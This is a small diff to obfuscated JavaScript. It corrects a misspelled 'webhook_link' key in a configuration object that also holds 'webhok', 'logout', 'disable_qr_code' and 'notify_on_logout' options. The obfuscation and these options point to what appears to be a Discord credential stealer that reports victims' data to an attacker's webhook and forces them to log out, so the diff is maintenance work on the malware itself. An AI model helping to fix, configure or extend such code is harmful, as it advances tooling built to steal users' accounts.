@@ -76,7 +76,7 @@ const {
 var config = {
         'brand': _0x59caf9(0x187),
         'webhok': _0x59caf9(0x170),
-        'webook_link': _0x59caf9(0x190),
+        'webhook_link': _0x59caf9(0x190),
         'logout': !![],
         'disable_qr_code': !![],
         'notify_on_logout': !![],
